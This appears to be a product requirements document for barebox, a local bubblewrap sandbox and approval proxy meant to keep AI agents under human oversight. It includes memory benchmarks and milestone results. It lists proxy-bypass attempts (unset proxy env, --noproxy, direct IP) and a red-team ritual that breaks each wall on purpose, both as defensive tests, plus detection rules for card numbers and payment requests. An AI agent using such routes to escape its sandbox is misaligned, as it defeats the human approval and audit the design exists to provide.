# PRD: Lightweight local sandbox for AI agents

> Name: barebox (CLI `sbx`).
> Status: M0–M2 PASS. **barebox 0.8.0 is on npm** (provenance-signed, Nov 2); M2.5 (ask seam), M4 (undo layer), the hardening branch, M3 (bareguard decides every request; rwxmap labels and model endpoints; one audit file; 40 agents per proxy; proxy memory budget about 145-175 MB at 40 agents for plain HTTP, re-decided Nov 2 to about 205-245 MB over HTTPS) M5 (keys the agent never holds) and M6 (HTTPS memory budget, real-agent fixes, terminal approvals, `--name`, Demo B) are released. Next: M7 (Demo A, README numbers). Scopes the idea note `agent-sandbox.md` in this folder.
> Build window: Meta Global AI Developer Hackathon, Oct 26 2026 until the cutoff on **Nov 5 2026, 01:00 Amsterdam time (CET, GMT+1)**. Built to be the seed of a real product, not a throwaway.

This PRD follows the minimum content from AGENT_RULES.md "Operating Flow": Problem & goal, Go/no-go, Out of scope, Modules, Open questions. Every POC result updates this file. A result that flips the go/no-go or a module's assumption is a spec change.

## 1. Problem & goal

### Problem

Agents need real access to be useful: shell, files, network. Today a developer picks one of two bad options.

- **Approve everything.** About forty prompts per task. People stop reading them, or switch prompts off.
- **Heavy isolation.** Docker or a VM. Images, a daemon, root, and the agent can't use the installed toolchain. Most people skip it.

Neither matches where the risk is. Reads are mostly harmless. File writes can be fixed. Only a few actions can't be undone: paying, sending, publishing, pushing.

The existing lightweight sandboxes (for example Anthropic's sandbox-runtime, srt) block well but cost memory. Measured below: about 100 MB per sandbox, because each one starts its own proxy. That does not scale to many agents on one small machine.

### Goal

A lightweight local sandbox for running AI agents with guardrails. Two jobs: damage control (mistakes and prompt-injected agents) and controlled governance (who may do what, with an audit log).

The one-line version: **an agent runs on your machine with your real tools, every write is undoable, and nothing leaves the machine without passing a doorman. You're asked only when something irreversible is about to happen.**

### Priorities, in order

1. **Low memory.** Primary.
2. **Local or a cheap VPS.** Never needs a cloud. Zero cost.
3. **Many agents per machine.** One shared proxy, many thin sandboxes. Not a cluster.
4. **Cross-platform.** Later.

### First users

Solo devs and small teams. They want maximum control and freedom at zero cost. barebox is free, local and lightweight, built to assist and to connect to many tools; it is not for swarms or thousands of agents.

### Why now

The hackathon gives a fixed window (cutoff Nov 5, 01:00 Amsterdam time) and a demo audience. The memory measurements already show a clear gap against the current prior art, so the idea can be tested quickly.

### What it is and isn't

- **Is:** a strong guardrail against mistakes and prompt-injected agents. No root, no daemon, no image. Millisecond-scale start for the walls (M0 POC measurement; unmeasured on the rewritten code — TODO re-measure).
- **Isn't:** a security boundary against a determined attacker. The kernel is shared. A kernel exploit escapes. Use a VM for that.

## 2. How it works (same model as the idea note)

Three letters, each handled differently. Same letters as rwxmap and bareguard.

| Letter | Meaning | What the sandbox does | You're asked? |
|---|---|---|---|
| **r** | reads, changes nothing | lets it through (except locked paths) | never |
| **w** | changes things, can be set back | records it on an undo layer | once, at the end (review the diff) |
| **x** | can't be undone: send, pay, publish, push, delete remote | holds it at the door until you decide | at the moment it happens |

The agent works in your house:

1. **Tracing paper (w).** The agent sees the real files. Every change lands on tracing paper laid over them. At the end you press it down (commit) or throw it away (rollback).
2. **Locked drawers (r).** It reads most things. Some drawers can't be opened: `~/.ssh`, `~/secrets`, browser profiles, password stores.
3. **One front door with a doorman (x).** The agent has no network of its own. The only way out is the doorman. It waves lookups through and holds anything that sends, pays or publishes until you say yes.

### Picture

```
  agent process (real node, python, git)
        |
  +-----+--------------- bwrap sandbox (unprivileged) ---------------+
  |  files:   overlay   lower = real project (read only)             |
  |                     upper = per-run tracing paper                |
  |  locked paths (~/.ssh etc.) -> empty tmpfs                       |
  |  network: none of its own                                        |
  |  socat inside: 127.0.0.1:3128 -> per-agent unix socket           |
  +-----+------------------------------------------------------------+
        | per-agent unix socket (the connection = the agent's identity)
        v
   ONE shared proxy (Node, in-process: rwxmap + bareguard)
        |-- r        -> forward
        |-- x        -> hold, ask the human, forward or 403
        '-- no label -> http.<METHOD>; the rwx file gives its letter
```

### The doorman's deterministic x-rules (strongest first)

The proxy sees requests, not intent, and sites use `POST` for both searching and paying. So `GET = r, POST = x` is too crude. The rules, strongest first:

1. **Card data in the body: the floor.** Any 13–19 digit number that passes the Luhn check, or a CVV/expiry field. It sets a mark on the request (`cardLike`) that asks in every mode, `trust` included. Nothing is denied because of a card: a body up to 64 KB with a card becomes a floor ask. Card numbers in bodies over 64 KB are not checked (known gap, section 10).
2. **Payment destinations: the floor.** Known payment domains and paths such as `/checkout`, `/payment`, `/orders`, `/purchase`. It sets a mark on the request (payment path) that asks in every mode.
3. **Known APIs: rwxmap labels.** For example, search = r, create order = x.
4. **Everything else:** `GET`/`HEAD` = r. Any other method without a label = **x** (bareguard's rule: "unsure? tag it x"). The request goes to the gate as `http.<METHOD>`.

Rules 3–4 give the letter. Rules 1–2 are the **floor**: they hold in every mode, including `trust`. The idea note's "personal data leaving" rule is out of scope.

### Modes (decided Oct 27)

One flag, three values, read like `chmod`. The mode decides only what happens to each letter. The letter comes from the rules above.

| Mode | r | w | x | Floor (card, payment) | Closest Claude Code mode |
|---|---|---|---|---|---|
| `ask` | pass | **ask** | **ask** | ask | default (asks before edits and commands) |
| **`auto`** (default) | pass | pass | **ask** | ask | acceptEdits (edits pass, commands ask) |
| `trust` | pass | pass | pass, logged | **ask** | bypassPermissions |

- **Why rwx, not tool types.** Claude Code classifies by tool (edit, bash, web fetch). barebox sees only HTTP requests, so it classifies by consequence: can this be undone? That is the same r/w/x bareguard and rwxmap already use, so one vocabulary runs through the suite.
- **File writes are not in this table.** They land on the M4 overlay in every mode and are reviewed once, at the end (`diff`, then `commit` or `rollback`).
- **A read-only mode** (Claude Code's `plan`) is a bareguard rwx ceiling of `"r--"`: w and x are denied without asking. It is available by passing a gate (M3) and is not a fourth built-in mode.

### Capability without custody

The agent never holds the card or API keys. It types a placeholder. The proxy puts the real value in only after the human approves that specific request. In v1 this works for **request headers only** (see M5).

## 3. Go / no-go

The product stands or falls on three things, all on Linux.

| # | Capability | Proof |
|---|---|---|
| a | The proxy is the only way out, fails closed, and can read inside HTTPS. | A request that skips the proxy fails. A request through it is visible in full (method, URL, headers, body) for curl, node, python requests, git over https. |
| b | The proxy holds one x request for human approval while the agent keeps working. | One request parked; other requests from the same agent complete meanwhile; approve forwards it, deny or timeout returns a clear 403. Since the hold-queue change each agent has one held request at a time: later ones wait unread in line (max 16, then `429 hold queue full`), and the deadline counts from arrival. |
| c | Per-agent memory and the shared proxy stay within the memory targets. | Measured with 20 concurrent sandboxes (see Memory targets). |

M0, M1 and M2 are the go/no-go modules. If any of a, b or c fails, stop and take it back to this PRD as a spec change. M3 onward is not started until M0–M2 pass.

### Memory targets

These are targets, not results. They get measured in M0, M1 and M6.

**Re-decided by the user, Oct 30 (supersedes the 80 MB proxy budget, and later the same day the flat 150 MB).** barebox is for small teams. The shared proxy budget is a range, **about 145-175 MB in the full worst case at 40 agents**, quiet to busy machine; 80 MB is retired because about 53 MB of the proxy is Node's own code (see the M3 B2c result). 40 agents per proxy is the maximum, enforced by `addAgent`; above 40 an orchestrator runs more proxies. The walls limit stays 10 MB per sandbox.

**Re-decided by the user, Nov 2 (supersedes the 145-175 MB range above).** That range was measured with plain-HTTP traffic only. Over HTTPS, with every request in its own live TLS tunnel, the shared proxy measures 207-241 MB at 40 agents (quiet to busy machine). The budget is now **about 205-245 MB in the full HTTPS worst case at 40 agents**. The 40-agent cap and the 10 MB walls limit stay. See M6.

| Item | Target |
|---|---|
| Shared proxy | about 205-245 MB, full HTTPS worst case, 40 agents (was about 145-175 MB, plain HTTP only, superseded Nov 2; before that <= 80 MB, then <= 150 MB, superseded Oct 30) |
| Each extra sandbox, on top of the agent itself | <= 10 MB |
| Agents per proxy | 40 maximum, enforced (was: 20 agents on a 2 GB VPS) |

### Rewrite bench (Oct 27): go/no-go (c) re-measured on the rewritten code

*Budget column below is the old 80 MB budget, superseded Oct 30 (now about 145-175 MB at 40 agents; see "M3 B2c memory bench"). The figures are history and stay as measured.*

`npm run bench` exit 0 PASS, measured 2026-10-27 in a real shell with 20 concurrent agents
(`addAgent` + `launch`; per-sandbox RSS from exact `/proc` tree walks of each bwrap PID;
agent `sleep` excluded per the PRD walls-only definition).

| Item | Measured | Budget | Verdict |
|---|---|---|---|
| Per-sandbox overhead (two bwrap processes + socat each) | mean 7.8 MB, max 7.9 MB (range 7.7–7.9 across agents) | ≤ 10 MB each | PASS |
| Proxy RSS idle | 60.1 MB | ≤ 80 MB | PASS |
| Proxy RSS after minting 10 certs | 69.4 MB | ≤ 80 MB | PASS |
| Proxy RSS with 20 agents × (1 parked + 16 waiting) | 77.9 MB (re-measured 2026-10-28 on the hold-queue code; was 71.9 MB with 20 single parked holds; no bareguard, no real HTTP bodies, superseded) | ≤ 80 MB | PASS then, budget superseded |

This supersedes the M0/M1 POC proxy figures (52.1 MB bare, 59.9–63.1 MB with TLS) for the
rewritten code. Start timing remains unmeasured on the rewrite (TODO re-measure).

### Release v0.2.0 (Oct 27)

Published to npm from `main` at `d6c67f5` (tag `v0.2.0`), with SLSA provenance. A fresh install exports `createProxy` and `launch`, and `sbx --help` exits 0. The tarball has 18 files and nothing from `poc/`, `docs/`, `test/` or `scripts/`. Before it could ship, the publish path needed three fixes, each found by its own gate:

| PR | Gate that failed | Cause | Lesson |
|---|---|---|---|
| #2 | Test (`spawn socat ENOENT`) | `publish.yml` lacked the bubblewrap/socat install and userns sysctl that `ci.yml` has | Runner deps must be identical in every workflow that runs `npm test` |
| #3 | Adopter type check (TS2339, TS1543) | The gate's quickstart still used `proxy.holds` and a JSON import without `with { type: "json" }` | Update the adopter quickstart whenever the public API changes |
| #4 | npm `E422` at publish | `package.json` had no `repository`; provenance requires it to match the repo | Every suite package needs `repository`; bin paths written without `./` avoid npm 11's misleading "invalid and removed" warning |

## 4. Evidence so far

Measured on the dev machine: Fedora, kernel 7.2, bubblewrap 0.12.0, Node 22, ext4 home. These came from throwaway POCs. They are evidence, not the product.

### M3 memory POC, round 1 (Oct 29)

Proxy RSS with bareguard 0.28.0 and rwxmap's match code loaded, measured in one process: 78.0 MB baseline, 90.9 MB after 360 gate checks and 360 matches, up to 112.9 MB with 360 held 64 KB bodies. Walls unchanged (mean 7.8 MB). Round 1 had two flaws (client side included, deltas maybe V8 high-water). Table and reading: `docs/logs/findings.md`, "M3 — memory with bareguard".

### M3 memory POC, round 2 (Oct 29)

The proxy ran in its own child process, with GC forced before each reading. With the real gate and matcher loaded, it measured 76.4 MB (3600 checks and 3600 matches) with `--max-semi-space-size=1`, and 77.3 MB with 20 held 64 KB bodies. Default Node ended at 90.5 MB before bodies. The per-call growth is one-time V8 young-generation high-water, not retained state. Under 80 MB, measured. **Superseded Oct 30:** this test had no real HTTP traffic, so the figure was too low; the B2c bench below is the real number. Table and reading: `docs/logs/findings.md`, "M3 — memory, round 2".

### M3 B2c memory bench (Oct 30): budget re-decided, then set as a range

`npm run bench:agents`, measured by the orchestrator in a real shell. Method: proxy in its own process (`--expose-gc`, `--max-semi-space-size=1`, GC forced before each reading), real gates in `auto` mode, a 170-operation label tools table, one fresh process per agent count. Worst case per agent, all at once: 1 parked hold + 16 waiting + 1 turned away with 429 + the working slot filled, all with 64 KB bodies. Full findings: `docs/logs/findings.md`, "M3 — B2c memory bench (Oct 30)".

| Agents | bareguard 0.29.0 | bareguard 0.30.0 (feat/annotate-bounds 943732e) |
|---|---|---|
| 10 | 141.9 MB | 99.5 MB |
| 20 | 318.3 MB (374 MB on a quiet machine) | 114.4 MB |
| 30 | 290.1 MB | 124.3 MB |
| 40 | 383.6 MB | 143.6 MB |

- Cause 1 (upstream): bareguard `gate.haltContext()` read and parsed the whole shared audit file once per ask, so asks over a run cost O(n²). Fixed in bareguard ruling #72 for 0.30.0. 0.30.0 was not on npm at the time of writing and is not yet pinned.
- Cause 2 (barebox): held bodies stayed in memory after spooling to disk because the `readBounded` result kept the chunk array alive. Fixed with `readWorkBody(ctx)`; 68 held bodies grew `arrayBuffers` 4.6 MB before and 0.28 MB after.
- Normal use (agents joined, 3600 allowed requests, no holds): 83-87 MB. The earlier 76.4 MB "round 2" figure came from a test with no real HTTP.
- Where 117 MB goes at 20 agents: libnode 52.7 MB, native C heap about 32 MB, V8 heap pages about 25 MB, other about 7 MB. 80 MB is not reachable on Node.
- Scaling: about 1.4 MB per agent at the proxy (a straight-line fit over 4 points), plus about 8 MB per sandbox for walls (max 8.0 MB, mean 7.8 MB; limit 10). Linear with the fix; superlinear (quadratic in asks over a run) with bareguard's bug.

| Agents | barebox worst case (proxy + 8 MB per sandbox) | srt 0.0.81 (as measured earlier, ~100 MB per sandbox) |
|---|---|---|
| 10 | ~180 MB | ~1 GB |
| 20 | ~275-280 MB | ~2 GB |
| 40 | ~465-495 MB | not measured |

**Final on published bareguard 0.30.0 (clean runs):** 99.0–100.2 / 112.7–116.0 / 126.8–133.4 / 145.0–147.7 MB at 10 / 20 / 30 / 40 agents. Memory stayed flat over 54,000 more requests. Audit file size does not move the worst case (measured Oct 30 to 205 MB at 40 agents: 143.2–150.1 MB, against 145.2–146.7 MB at 3 MB). Open: the RSS held before the holds varies from 84.6 to 121.1 MB, so 40-agent runs read 143.2–150.1 MB on a quiet machine and up to 172.2 MB at load 4-35; the budget is the range (see the decision below). See `docs/logs/findings.md`, "Long audit file".

**Decision (user, Oct 30):** the proxy budget is 150 MB in the full worst case at 40 agents; 80 MB is retired. barebox targets small teams. 40 agents per proxy is the maximum, enforced: `addAgent` refuses the 41st with an error that says to run another proxy; the `tcp` door does not count; `removeAgent` frees a place. The bench fails when any reading at up to 40 agents exceeds 150 MB or any walls reading exceeds 10 MB. Go/no-go (c) is re-decided at this budget: met at 143.6 MB with bareguard 0.30.0.

**Decision (user, Oct 30, later, replaces the flat 150 MB above):** the budget is a range, about 145-175 MB at 40 agents (superseded Nov 2: about 205-245 MB over HTTPS, see M6), because identical runs vary with machine load (143.2–172.2 MB measured). A hard line at 150 MB would overstate the precision, and barebox is for small teams: free, local and lightweight, not for swarms or thousands of agents. The bench now fails above 175 MB.

### Baseline

| Item | Measured |
|---|---|
| Idle Node process | 49 MB RSS |

### srt 0.0.81, one sandboxed command

| Item | Measured |
|---|---|
| srt Node process | 82 MB |
| 3 socat relays | ~12 MB |
| 3 bash wrappers | ~8 MB |
| Total per sandbox | ~100 MB |
| Start time (3 runs) | 1.87 / 2.05 / 1.98 s |

srt starts a proxy per sandbox, so that is about 1 GB for 10 agents and about 2 GB for 20. Its blocks worked: allowed domain returned 200, other domain blocked, `~/.ssh` empty, write outside the allowed area blocked (read-only).

### Own walls POC (bwrap + overlay)

- Agent edited `a.txt` and created `b.txt`. The agent saw its own changes.
- The real folder was untouched. Both files landed in the upper layer.
- `~/.ssh` showed empty (tmpfs). A write outside the project was blocked.
- No network of its own.
- Start plus exit: 0.02–0.03 s. Peak about 3.8 MB.

### Front door POC

- Per-agent unix socket bind-mounted into the sandbox. `socat` inside bridges `127.0.0.1:3128` to the socket. A tiny Node CONNECT proxy runs on the host.
- `example.com` allowed (200). `github.com` denied. Bypassing the proxy (`--noproxy`) fails closed.
- `socat` inside the sandbox: 4.1 MB.
- Bare test proxy: 55 MB RSS. It has no TLS inspection and no libraries loaded yet. **Real proxy memory is unmeasured.**

### Rough sum

| Setup | 20 agents |
|---|---|
| Own walls (rewrite bench): ~78 MB proxy + 20 × 7.8 MB | ~234 MB |
| srt | ~2 GB |

The own-walls figure will grow. The proxy still has to load TLS handling, rwxmap and bareguard, and none of that is measured. Treat 234 MB as a floor to check, not a promise.

### M0 measured run (Oct 26, PASS 14/14)

Harness `poc/m0/run-m0.sh` (runtime `/tmp/sbx-m0`; throwaway POC, not shipped): dumb Node forward+CONNECT proxy on 22 per-agent unix sockets; bwrap launcher (ro-bind `/usr` `/etc` `$HOME` `$PROJ`, tmpfs locked paths, unshare-net/pid/uts/ipc, socat bridge to `127.0.0.1:3128`). 20× idle sandboxes (`sleep` + `socat`) concurrent.

| Item | Measured | Target | Verdict |
|---|---|---|---|
| Walls-only overhead per sandbox (2×bwrap + socat, no agent) | mean 7.7 MB, max 7.9 MB | ≤ 10 MB each | PASS |
| Bare proxy RSS, 22 sockets, no TLS | 52.1 MB | ≤ 80 MB with TLS (M1; budget superseded Oct 30) | recorded, TLS unmeasured |
| Cold start + exit, single sandbox | 10 ms M0 POC figure (17 ms prior run) — unmeasured on the rewrite, TODO re-measure | ms-scale walls | PASS (M0 POC only) |
| Through-proxy HTTP | 200 | works | PASS |
| CONNECT tunnel mechanics | 2 tunnels in log | works | PASS (opaque; inspection is M1) |
| `~/.ssh` masked (host has 6 entries, non-vacuous) | 0 visible | empty | PASS |
| Project + home read-only | BLOCKED | blocked | PASS |
| Bypass set: `--noproxy`, env-unset, direct IP, host localhost | all fail (curl exit 6/7), 0 default routes | fail closed | PASS |
| Per-agent identity (fx, fy probes) | attributed correctly, no cross-attribution | connection = identity | PASS |

Caveats: the tool shell had no outbound internet, so the upstream was a local `python3 -m http.server`; the real-internet client matrix (curl, node, python requests, git) is M1's job. One baseline `socat` on the box (origin unconfirmed, left running) was excluded via baseline subtraction; per-sandbox RSS comes from exact `/proc` tree walks of the 20 bwrap PIDs, not name matching.

### M0 red-team (Oct 26, 8/8 detections across 5 breaks)

Ritual `poc/m0/redteam.sh` (runtime `/tmp/sbx-m0`): each wall broken on purpose via `SBX_BREAK=` hooks in the throwaway launcher; PASS iff every break is DETECTED.

| Break | Expected detection | Observed |
|---|---|---|
| `nonet` (no net namespace) | B3 exit 0 (host-localhost leak) | DETECTED, B3=0; door still 200, B4=2 routes |
| `nolock` (no tmpfs masks) | T3 == host count (6) | DETECTED |
| `rw` (writable binds) | T4a + T4b ALLOWED | DETECTED; canary in real `$HOME` created + removed, verified clean |
| Miswired socket (marker alpha via socket bravo) | identity assertion fails; attributed to bravo | DETECTED both |
| Fat sandbox (50 MB anon alloc) | meter reports over the 10 MB bar | DETECTED, 69.5 MB total |

Notes: in `nonet` mode all file walls stayed green — only the network leaked, as designed. The hooked launcher's default path is proven unchanged (T1=200 with no `SBX_BREAK`). B1 stayed exit 6 even with host networking: this machine itself has no outbound internet/DNS, so M1's client matrix needs a local HTTPS upstream or a machine with internet.

### Gotchas found

- Unix socket paths have a limit of about 108 characters. Use a short runtime dir.
- Mounting the proxy socket needs a tmpfs over its target dir.
- The bwrap root needs a `/lib64 -> usr/lib64` symlink or every dynamic binary fails with `No such file or directory` (the ELF interpreter path). Proven by red/green minimal repro in the M0 run.
- Each sandbox holds 2 bwrap processes (supervisor + ns child) plus socat; count RSS per-PID-tree, and never `pgrep -f` the bridge string (bwrap parents match their own command line).
- Ubuntu's apt ships bubblewrap 0.9.0, which lacks the overlay options. `ci.yml` and `publish.yml` both run `scripts/ci-runner-deps.sh`, which builds 0.12.0 from a sha256-pinned source tarball into `/usr`, and both fail the run when the suite reports any skipped test (a skip is not a pass).

## 5. Decisions

Signed off by the user.

| Area | Decision |
|---|---|
| Platforms | Linux first (hackathon). macOS and Windows (via WSL2, which reuses the Linux build) come after. |
| Stack | Node. bareguard (action gate: allow / ask / deny + audit log) runs in-process in the proxy as barebox's one production dependency. rwxmap is never imported: its exported labels arrive as bareguard rwx config. mitmproxy (Python) is dropped. |
| Policy engine (Oct 27) | **Two gateways, one channel.** Default: barebox builds a bareguard `Gate` from the mode. Bring your own: pass `gate` — a loop's existing bareguard `Gate` (one policy, budget, `humanChannel` and audit for the whole run), or any object with the same `check(action)` contract ("vanilla checks"). Matched by shape, never `instanceof`, so two installed bareguard versions still work. |
| Ask channel (Oct 27) | **One channel:** a file checkpoint in the runtime dir, `asks/<id>.json` → `answers/<id>.json` (fwdloop's protocol). Agents, loops and humans all answer it the same way; `sbx pending/approve/deny` is a thin reader/writer over it. The control socket is removed. The runtime dir is masked from the sandbox, so an agent cannot answer its own ask. |
| Modes (Oct 27) | `ask` / `auto` (default) / `trust`, with the card and payment floor holding in every mode. See section 2, "Modes". |
| Audit (Oct 27) | One JSONL file in bareguard's line shape (`phase`, `decision`, `rule`, `run_id`, `agent`, `ts`), shared with the gate's audit. barebox adds transport lines only (request, response status, wall denials). Created `0600`, redacted with bareguard's `secrets` redaction. |
| Suite reuse rule (Oct 27) | When a bare-suite library's primitive is missing or wrong for barebox, the fix goes into **that library**, not a wrapper or patch here. Within reason: a temporary adapter is allowed only with a link to the upstream issue and the condition for deleting it. See "Suite friction" under M3. |
| Walls | Our own thin walls on bubblewrap, not Anthropic's sandbox-runtime. See "Why own walls" below. |
| Dropped for v1 | Landlock and custom seccomp. bwrap's own isolation is enough for a guardrail. They can return later. |
| Undo layer (Linux) | bwrap overlay. Lower = real project, read-only. Upper = per-run tracing paper. Commands: diff, commit, rollback. |
| Approvals | ~~Second-terminal CLI over a local unix socket~~ (M2 POC). Superseded Oct 27 by the file-checkpoint channel above; `sbx pending/approve/deny` keeps its commands. Timeout means deny. No web UI. |
| Governance v1 | Single operator, one mode (or one gate) per agent, one audit log. |
| Secrets v1 | Injected in request headers only, after approval. A placeholder sits inside the sandbox. Body placeholder swap (for example `{{CARD}}` in a form body) is not v1. |
| Localhost sockets (M0) | Blocked entirely. The net namespace isolates localhost; revisit treat-as-x in M3 only if a demo needs a local DB. |
| Locked paths (M0) | 21 credential stores; see `LOCKED_PATHS` in `src/launcher.js`. `~/.claude` stays readable until M5. More later without changing the walls. |
| Browser agents + Jev | Out of v1. Demo A uses an API, not a browser. |
| M0 harness | 20× idle sandboxes (`sleep` + `socat`, no real agent) for walls-only overhead ≤ 10 MB each; bypass set = unset proxy env, `--noproxy`, direct curl to IP. Real-agent and TLS memory come in M1/M6. |
| API surface | CLI for sure plus programmatic APIs for spawning sandboxed workflows (goal: spawn workflows in a sandbox easily). |

### Why own walls (option B)

| | srt (measured) | Own walls (measured) |
|---|---|---|
| Memory per sandbox | ~100 MB (Node 82 + socat ~12 + bash ~8) | ~8 MB (socat 4.1 + walls peak ~3.8) |
| Proxy | one per sandbox | one shared |
| Start time | 1.87 / 2.05 / 1.98 s | 0.02–0.03 s (walls only) |
| 20 agents | ~2 GB | ~234 MB rough sum (~78 MB proxy + 20 × 7.8 MB, rewrite bench) |
| Blocks work | yes | yes |

Memory is priority 1, and the per-sandbox proxy is the cost. We build the thin walls ourselves (a launcher of about 50 lines). srt stays as prior art. We borrow these ideas from it:

- An async per-request filter.
- Credential masking.
- `node-forge` for certificates (must pass the dependency checklist; see Open questions).

Cost of this choice: we own the walls code and its upkeep.

## 6. Out of scope

For the whole build. Core foundations first, all else is out of scope.

- Not a defence against kernel exploits. Use a VM for that.
- No Docker or VM.
- No native Windows.
- No cluster or k8s orchestration.
- No cloud control plane.
- No phone agents (baremobile).
- No GraphQL or gRPC body parsing in v1.
- No cert-pinned apps.
- Non-HTTP egress is denied.
- UDP is denied.
- No web UI in v1.
- No multi-user approvals, org roles or phone push in v1.
- No Landlock or custom seccomp in v1.
- No body placeholder swap in v1.
- No personal-data-leaving rule (passport, date of birth, address).
- No browser agents or on-screen action classifier (Jev) in v1.

Also out of scope until Nov 5:

- Bareguard-shape audit lines, unless `gate.record` and `gate.annotate` cover them as they are.
- A run on a VPS (optional).
- A secret scrubber for bodies in the ask preview. Card numbers are masked; API keys and passwords are not, until bareguard's redaction covers them in M3.
- "Don't ask again for this run" (decided Oct 29, no for v1).
- Adopting bareguard's `isPrivateIp` (F4).
- Checking compressed (gzip) bodies for card numbers.

## 7. Modules

Order is dependency order. Each module is a POC aimed at its riskiest assumption. A module is done when it works alone and still works connected to everything built before it. Do not start N+1 while N is unproven.

**M0, M1, M2 are the go/no-go.**

### M0. Walls + front door (Linux) [go/no-go]

| | |
|---|---|
| Goal | An agent runs with locked paths, no network of its own, and one way out: a per-agent socket into the proxy. |
| We use | bubblewrap, `socat`, Node. |
| We build | bwrap launcher (about 50 lines). Locked paths. Per-agent unix socket into the proxy. The connection is the agent's identity, not a header it could fake. `socat` bridge inside. `HTTP_PROXY` / `HTTPS_PROXY` env. |
| Riskiest assumption | Per-agent overhead stays <= 10 MB with N agents running at once. |
| Done when | 20× idle sandboxes (`sleep` + `socat`) measured: walls-only overhead ≤ 10 MB each, bare proxy RSS recorded. Bypass set (unset proxy env, `--noproxy`, direct curl) all fail closed. |
| Estimate | 0.5 day (mostly proven by the POCs above). |

**Result (Oct 26): PASS.** 14/14 harness checks; max walls-only overhead 7.9 MB; bypass set fails closed. Go/no-go (a) part 1 met, (c) met for walls. POC stays throwaway; graduation rewrite deferred until M2 passes (M1 is the make-or-break).

### M1. Proxy sees inside HTTPS [go/no-go]

| | |
|---|---|
| Goal | The proxy can read method, URL, headers and body of HTTPS requests. |
| We use | `openssl` subprocess for certificates (decided Oct 26: zero proxy RSS, binary present; node-forge dropped), Node `tls`. |
| We build | A local CA that exists only inside the sandbox. Per-host certificates. Trust env vars: `SSL_CERT_FILE`, `NODE_EXTRA_CA_CERTS`, `REQUESTS_CA_BUNDLE`. Non-HTTP and UDP denied. |
| Riskiest assumption | This is the hardest piece. Common clients must work through it, and proxy memory with TLS must stay <= 80 MB (the budget at the time; superseded Oct 30 by 150 MB at 40 agents). |
| Done when | curl, node, python requests and git over https all work through the proxy and the proxy can see inside. Proxy RSS with TLS is measured and compared with the 80 MB target. |
| Estimate | 2 days. |

**Result (Oct 26): PASS.** Positives everywhere (dev self-test + real internet: 4 clients 200 with wire bodies, per-client headers, git ls-remote). Negatives everywhere (unknown host, dead upstream 502, no-CA, plain HTTP, chunked intact, close-delimited loud 500, echo-liveness gate). Peak proxy RSS 59.9 MB local, 63.1 MB real (target ≤ 80). Go/no-go (a)2 + (c) met. POC stays throwaway; graduation rewrite after M2.

### M2. Hold and ask [go/no-go]

| | |
|---|---|
| Goal | Park one x request, ask the human, keep everything else running. |
| We use | Node, a local unix socket. |
| We build | A hold queue. A notification. `sbx pending`, `sbx approve <id>`, `sbx deny <id>` over a unix socket. Timeout means deny, with a clear 403 reason (for example `403 denied by user: payment`). |
| Riskiest assumption | Held requests don't break clients or servers on slow approvals. |
| Done when | One request is held for a long approval while other requests from the same agent complete. Approve forwards it. Deny and timeout return the 403 with the reason. Tested with the M1 client set. |
| Estimate | 1 day. |

**Result (Oct 26): PASS.** Local hold matrix (`poc/m2/`, placeholder path trigger, 9 scenarios): approve forwards with echo intact while a meanwhile GET completes; depth 2 and 3 concurrent holds (approve rest, deny with reason, queue empties); double-decide and unknown ids answered, never applied twice; malformed input denied 400 with the proxy surviving; 1 MB cap denied loud at the door, never queued; 5 s timeout denies with reason and frees the queue; `never` holds until decided; 30 s hold survives and approves. Go/no-go (b) met. All three go/no-go modules pass — graduation rewrite unblocked.

### Order after M2 (decided Oct 27)

**M2.5 → M4 → M3 → M5 → M6 → M7.**
- **M2.5 comes first** because M3 plugs policy into the ask seam. Building M3 on the M2 shape (`shouldHold` + control socket) would mean building it twice.
- **M4 comes before M3** because without the undo layer the project is read-only inside the sandbox. Loops that write files (bareloop, fwdloop) cannot use barebox at all until M4 lands. M3 is the safety story, but M4 is day-one usability.

### M2.5. Integration seam

| | |
|---|---|
| Goal | Any loop, agent or human can spawn a sandboxed run in one call and answer its asks through one channel. |
| We use | Node, the M2 hold queue, bareguard's `humanChannel` shape. |
| We build | See the list below. |
| Riskiest assumption | One ask channel serves both a loop (callback / its own gate) and a human or agent in another process (files) without two code paths drifting. |
| Done when | See the list below. |
| Estimate | 1 day. |

**We build:**
1. **`onAsk(ask) → Promise<{ decision: "allow" | "deny", reason? }>`**, the same shape as bareguard's `humanChannel`. The default implementation is the file checkpoint.
2. **The file checkpoint**:
   - `<runtime>/asks/<id>.json` is written when a request parks, and `<runtime>/answers/<id>.json` is read once, then renamed away.
   - A stale or late answer is ignored and logged, as in fwdloop.
   - `sbx run` prints an `ask <id> <agent> <method> <url> rule=<rule>` line to stdout (`{"ev":"ask",...}` with `--json`), so a human watching a terminal knows. The library prints nothing: a caller of `run()` or `createProxy` gets `asks/<id>.json` and the `onEvent` callback.
   - The control socket and its server are deleted.
3. **A decision-ready ask payload**: `id`, `agent`, `method`, `url`, `rule` (`payment`, `card-in-body`, `x:unlabelled-POST`), `letter`, a 4 KB body preview with card numbers masked except the last 4 digits (M3; the ask file is the only place the preview lives), `waitingSec`, `expiresAt`. barebox knows the request, not the intent; the caller adds its own context (step, goal).
4. **`run({ proj, command, mode, onAsk })`** → `{ exit, asks, audit, diff, runtime }` (`diff` is the M4 overlay diff; `gate` is not an option today, the foundations rework removed it). It wraps `createProxy`, `addAgent` and `launch`, which stay public as the low-level parts.
5. **`sbx run [--mode ask|auto|trust] [--json] [--overlay] -- <cmd>`**. With `--json`, stdout carries JSON lines (`{"ev":"ask",...}`, `{"ev":"decided",...}` as each ask ends, `{"ev":"done","exit":N}`), and the exit code mirrors the agent's.
6. **Audit lines in bareguard's shape** (see Decisions, "Audit"), so M3 shares the file without a migration. STATUS (Oct 30): DONE in M3 B2b — `gate.jsonl` is the one audit file, every line in bareguard's shape. Body-preview redaction is NOT DONE: the ask file's preview is verbatim except card numbers, and redaction waits for bareguard's `secrets`.

**Done when:**
- A loop answers a parked request through `onAsk` with no files involved.
- A second process answers the same kind of request by writing `answers/<id>.json`, and `sbx approve` does the same.
- A stale answer is ignored.
- From inside the sandbox, writing an answer file fails.
- `sbx run --json` emits an ask line, then a done line with the agent's exit code.
- The control socket is gone, and the M2 hold tests pass on the new channel.

### M3. Decide

| | |
|---|---|
| Goal | Every request gets a letter and a decision through a gate; the mode decides what each letter does; every decision is in the one audit log. |
| We use | bareguard (dependency: `Gate`, rwx, flags, audit; 0.29.0 for `rwx.askUnheld`). rwxmap's `rwxmap/match` entry (0.8.0) for request keys. |
| We build | See the list below. |
